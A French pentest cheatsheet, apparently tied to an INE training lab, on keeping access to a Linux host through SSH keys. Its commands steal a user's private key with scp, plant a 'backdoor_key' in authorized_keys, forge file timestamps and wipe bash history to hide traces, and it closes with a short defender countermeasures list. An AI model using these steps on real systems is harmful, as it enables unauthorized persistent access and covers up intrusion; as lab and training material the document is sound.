# Cheatsheet - Persistance SSH avec Clés

## 🎯 Objectif
Maintenir l'accès à une machine cible en utilisant les clés SSH même après modification des identifiants.

## 📋 Prérequis
- Accès initial avec identifiants (username/password)
- Service SSH actif sur la cible
- Permissions de lecture sur le répertoire `.ssh`

## 🔍 Phase de Reconnaissance

### Vérifier la connectivité
```bash
ping -c 4 <target>
```

### Scanner les ports SSH
```bash
nmap <target>
nmap -p 22 <target>
```

## 🔐 Phase d'Accès Initial

### Connexion SSH standard
```bash
ssh <username>@<target>
# Entrer le mot de passe
```

### Énumération du répertoire home
```bash
ls -al ~/
ls -al ~/.ssh/
```

**Fichiers clés à rechercher :**
- `id_rsa` - Clé privée
- `id_rsa.pub` - Clé publique  
- `authorized_keys` - Clés autorisées
- `known_hosts` - Hosts connus

## 💾 Phase de Récupération des Clés

### Copier la clé privée vers l'attaquant
```bash
# Méthode 1: SCP
scp <username>@<target>:~/.ssh/id_rsa ./id_rsa_target

# Méthode 2: Affichage et copie manuelle
cat ~/.ssh/id_rsa
```

### Sécuriser la clé privée
```bash
chmod 400 id_rsa_target
```

## 🚀 Phase de Persistance

### Connexion avec clé privée
```bash
ssh -i id_rsa_target <username>@<target>
```

### Options SSH utiles
```bash
# Ignorer la vérification de l'host
ssh -i id_rsa_target -o StrictHostKeyChecking=no <username>@<target>

# Connexion silencieuse
ssh -i id_rsa_target -o LogLevel=QUIET <username>@<target>

# Spécifier le port
ssh -i id_rsa_target -p 2222 <username>@<target>
```

## 🛡️ Techniques Avancées de Persistance

### Créer une nouvelle paire de clés
```bash
# Sur la machine attaquante
ssh-keygen -t rsa -b 4096 -f ./backdoor_key

# Ajouter la clé publique aux authorized_keys de la cible
cat backdoor_key.pub >> ~/.ssh/authorized_keys
```

### Modifier les permissions
```bash
chmod 700 ~/.ssh/
chmod 600 ~/.ssh/authorized_keys
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
```

### Masquer la persistance
```bash
# Modifier les timestamps
touch -r /etc/passwd ~/.ssh/authorized_keys

# Ajouter la clé dans un fichier existant
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

## 🧹 Nettoyage des Traces

### Supprimer les logs de connexion
```bash
# Vider les logs
> ~/.bash_history
history -c

# Supprimer des lignes spécifiques
sed -i '/ssh/d' ~/.bash_history
```

### Nettoyer les fichiers temporaires
```bash
rm -f ~/wait
rm -f /tmp/ssh-*
```

## ⚠️ Points d'Attention

### Vérifications de sécurité
- **Permissions des fichiers SSH** : Respecter les permissions strictes
- **SELinux/AppArmor** : Peut bloquer certaines opérations
- **Surveillance** : Les connexions SSH sont souvent loggées

### Erreurs communes
```bash
# ❌ Permissions incorrectes
chmod 777 id_rsa  # DANGER!

# ✅ Permissions correctes
chmod 400 id_rsa  # Lecture seule pour le propriétaire
```

## 🔧 Dépannage

### Problèmes de connexion
```bash
# Mode debug
ssh -v -i id_rsa_target <username>@<target>

# Vérifier les permissions
ls -la ~/.ssh/

# Tester la clé
ssh-keygen -l -f id_rsa_target
```

### Messages d'erreur courants
- `Permission denied (publickey)` → Vérifier permissions et chemin
- `Bad permissions` → Corriger avec chmod 400
- `Host key verification failed` → Utiliser -o StrictHostKeyChecking=no

## 📝 Exemple Complet

```bash
# 1. Reconnaissance
nmap -p 22 demo.ine.local

# 2. Accès initial
ssh student@demo.ine.local
# Password: password

# 3. Énumération
ls -al ~/.ssh/

# 4. Exfiltration de clé
exit
scp student@demo.ine.local:~/.ssh/id_rsa ./stolen_key

# 5. Sécurisation
chmod 400 stolen_key

# 6. Persistance
ssh -i stolen_key student@demo.ine.local

# 7. Récupération du flag
cat flag.txt
```

## 🛡️ Contre-mesures

### Pour les défenseurs
- Rotation régulière des clés SSH
- Surveillance des connexions par clés
- Désactiver l'authentification par mot de passe
- Utiliser des certificats SSH plutôt que des clés statiques
- Monitoring des modifications dans ~/.ssh/

---
*⚡ Cette technique exploite la persistance des clés SSH après modification des mots de passe.*